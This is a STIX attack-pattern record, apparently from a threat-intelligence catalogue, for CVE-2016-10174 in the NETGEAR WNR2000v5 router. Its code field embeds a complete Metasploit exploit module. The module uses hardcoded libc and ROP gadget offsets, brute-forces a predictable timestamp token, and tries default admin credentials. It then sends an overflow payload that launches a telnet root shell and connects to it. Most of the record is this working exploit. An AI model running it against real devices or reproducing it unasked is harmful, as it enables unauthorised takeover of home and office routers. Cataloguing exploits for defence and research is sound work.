{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9bdc752e-e4fd-47f7-85ed-fc50aadd4383",
    "created": "2024-08-14T17:03:24.124323Z",
    "modified": "2024-08-14T17:03:24.124327Z",
    "name": "NETGEAR WNR2000v5 (Un)authenticated hidden_lang_avi Stack Buffer Overflow",
    "description": " The NETGEAR WNR2000 router has a stack buffer overflow vulnerability in the hidden_lang_avi parameter. In order to exploit it, it is necessary to guess the value of a certain timestamp which is in the configuration of the router. An authenticated attacker can simply fetch this from a page, but an unauthenticated attacker has to brute force it. Brute forcing the timestamp token might take a few minutes, a few hours, or days, but it is guaranteed that it can be bruteforced. This module implements both modes, and it works very reliably. It has been tested with the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware revisions v4 and v3, but this has not been tested - with these routers it might be necessary to adjust the LibcBase variable as well as the gadget addresses. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netgear_wnr2000_rce.rb",
            "external_id": "netgear_wnr2000_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10174"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Dec/72"
        },
        {
            "source_name": "reference",
            "url": "http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'time'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::CRand\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NETGEAR WNR2000v5 (Un)authenticated hidden_lang_avi Stack Buffer Overflow',\n      'Description'    => %q{\n        The NETGEAR WNR2000 router has a stack buffer overflow vulnerability in the hidden_lang_avi\n        parameter.\n        In order to exploit it, it is necessary to guess the value of a certain timestamp which\n        is in the configuration of the router. An authenticated attacker can simply fetch this\n        from a page, but an unauthenticated attacker has to brute force it.\n        Brute forcing the timestamp token might take a few minutes, a few hours, or days, but\n        it is guaranteed that it can be bruteforced.\n        This module implements both modes, and it works very reliably. It has been tested with\n        the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware\n        revisions v4 and v3, but this has not been tested - with these routers it might be necessary\n        to adjust the LibcBase variable as well as the gadget addresses.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix'],\n      'References'     =>\n        [\n          ['CVE', '2016-10174'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Dec/72'],\n          ['URL', 'http://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']\n        ],\n      'Targets'        =>\n        [\n          [ 'NETGEAR WNR2000v5',\n            {\n              'LibcBase'             => 0x2ab24000,         # should be the same offset for all firmware versions (in libuClibc-0.9.30.1.so)\n              'SystemOffset'         => 0x547D0,\n              'GadgetOffset'         => 0x2462C,\n  #The ROP gadget will load $sp into $a0 (which will contain the system() command) and call $s0 (which will contain the address of system()):\n  #LOAD:0002462C                 addiu   $a0, $sp, 0x40+arg_0\n  #LOAD:00024630                 move    $t9, $s0\n  #LOAD:00024634                 jalr    $t9\n              'Payload'        =>\n                {\n                  'BadChars'         => \"\\x00\\x25\\x26\",\n                  'Compat'  => {\n                    'PayloadType'    => 'cmd_interact',\n                    'ConnectionType' => 'find',\n                  },\n                },\n            }\n          ],\n        ],\n      'Privileged'     => true,\n      'Arch'           => ARCH_CMD,\n      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n      'DisclosureDate'  => '2016-12-20',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('HttpUsername', [true, 'Username for the web interface (not needed but exploitation is faster)', 'admin']),\n        OptString.new('HttpPassword', [true, 'Password for the web interface (not needed but exploitation is faster)', 'password']),\n      ])\n    register_advanced_options(\n      [\n        OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),\n        OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting a shell', 200])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'     => '/',\n      'method'  => 'GET'\n    })\n    if res && res.headers['WWW-Authenticate']\n      auth = res.headers['WWW-Authenticate']\n      if auth =~ /WNR2000v5/\n        return Exploit::CheckCode::Detected\n      elsif auth =~ /WNR2000v4/ || auth =~ /WNR2000v3/\n        return Exploit::CheckCode::Unknown\n      end\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def uri_encode (str)\n    \"%\" + str.scan(/.{2}|.+/).join(\"%\")\n  end\n\n  def calc_address (libc_base, offset)\n    addr = (libc_base + offset).to_s(16)\n    uri_encode(addr)\n  end\n\n  def get_current_time\n    res = send_request_cgi({\n      'uri'     => '/',\n      'method'  => 'GET'\n    })\n    if res && res['Date']\n      date = res['Date']\n      return Time.parse(date).strftime('%s').to_i\n    end\n  end\n\n  def get_auth_timestamp\n    res = send_request_raw({\n      'uri'     => '/lang_check.html',\n      'method'  => 'GET',\n      # automatically uses HttpPassword and HttpUsername to authenticate\n    })\n    if res && res.code == 401\n      # try again, might fail the first time\n      res = send_request_raw({\n        'uri'     => '/lang_check.html',\n        'method'  => 'GET',\n      # automatically uses HttpPassword and HttpUsername to authenticate\n      })\n    end\n    if res && res.code == 200\n      if res.body =~ /timestamp=([0-9]{8})/\n        $1.to_i\n      end\n    end\n  end\n\n  # Do some crazyness to force Ruby to cast to a single-precision float and\n  # back to an integer.\n  # This emulates the behaviour of the soft-fp library and the float cast\n  # which is done at the end of Netgear's timestamp generator.\n  def ieee754_round (number)\n    [number].pack('f').unpack('f*')[0].to_i\n  end\n\n\n  # This is the actual algorithm used in the get_timestamp function in\n  # the Netgear firmware.\n  def get_timestamp(time)\n    srandom_r time\n    t0 = random_r\n    t1 = 0x17dc65df;\n    hi = (t0 * t1) >> 32;\n    t2 = t0 >> 31;\n    t3 = hi >> 23;\n    t3 = t3 - t2;\n    t4 = t3 * 0x55d4a80;\n    t0 = t0 - t4;\n    t0 = t0 + 0x989680;\n\n    ieee754_round(t0)\n  end\n\n  def get_payload\n    rand_text_alpha(36) +                                                                    # filler_1\n      calc_address(target['LibcBase'], target['SystemOffset']) +                             # s0\n      rand_text_alpha(12) +                                                                  # s1, s2 and s3\n      calc_address(target['LibcBase'], target['GadgetOffset']) +                             # gadget\n      rand_text_alpha(0x40) +                                                                # filler_2\n      \"killall telnetenable; killall utelnetd; /usr/sbin/utelnetd -d -l /bin/sh\"             # payload\n  end\n\n  def send_req(timestamp)\n    begin\n      query_str = (timestamp == nil ? \\\n        '/lang_check.html' : \\\n        \"/lang_check.html%20timestamp=#{timestamp.to_s}\")\n      res = send_request_raw({\n          'uri'     => '/apply_noauth.cgi',\n          'query'   => query_str,\n          'method'  => 'POST',\n          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },\n          'data'    => \"submit_flag=select_language&hidden_lang_avi=#{get_payload}\"\n      })\n    rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      return\n    end\n  end\n\n  def exploit\n    # 1: try to see if the default admin username and password are set\n    timestamp = get_auth_timestamp\n\n    # 2: now we try two things at once:\n    # one, if the timestamp is not nil then we got an authenticated timestamp, let's try that\n    # two, if the timestamp is nil, then let's try without timestamp first (the timestamp only gets set if the user visited the page before)\n    print_status(\"#{peer} - Trying the easy way out first\")\n    send_req(timestamp)\n    begin\n      ctx = { 'Msf' => framework, 'MsfExploit' => self }\n      sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })\n      if not sock.nil?\n        print_good(\"#{peer} - Success, shell incoming!\")\n        return handler(sock)\n      end\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      sock.close if sock\n    end\n\n    print_error(\"#{peer} - Well that didn't work... let's do it the hard way.\")\n\n    # no shell? let's just go on and bruteforce the timestamp\n    # 3: get the current date from the router and parse it\n    end_time = get_current_time\n    if end_time.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Unable to obtain current time\")\n    end\n    if end_time <= datastore['TIME_OFFSET']\n      start_time = 0\n    else\n      start_time = end_time - datastore['TIME_OFFSET']\n    end\n    end_time += datastore['TIME_SURPLUS']\n\n    if end_time < (datastore['TIME_SURPLUS'] * 7.5).to_i\n      end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i\n    end\n\n    print_good(\"#{peer} - Got time #{end_time} from router, starting exploitation attempt.\")\n    print_status(\"#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).\")\n\n    # 2: work back from the current router time minus datastore['TIME_OFFSET']\n    while true\n      for time in end_time.downto(start_time)\n        timestamp = get_timestamp(time)\n        sleep 0.1\n        if time % 400 == 0\n          print_status(\"#{peer} - Still working, trying time #{time}\")\n        end\n        send_req(timestamp)\n        begin\n          ctx = { 'Msf' => framework, 'MsfExploit' => self }\n          sock = Rex::Socket.create_tcp({ 'PeerHost' => rhost, 'PeerPort' => 23, 'Context' => ctx, 'Timeout' => 10 })\n          if sock.nil?\n            next\n          end\n          print_status(\"#{peer} - Success, shell incoming!\")\n          return handler(sock)\n        rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n          sock.close if sock\n          next\n        end\n      end\n      end_time = start_time\n      start_time -= datastore['TIME_OFFSET']\n      if start_time < 0\n        if end_time <= datastore['TIME_OFFSET']\n          fail_with(Failure::Unknown, \"#{peer} - Exploit failed\")\n        end\n        start_time = 0\n      end\n      print_status(\"#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}\")\n\n      # let the router clear the buffers a bit...\n      sleep 30\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-20",
    "x_mitre_platforms": [
        "['unix']"
    ]
}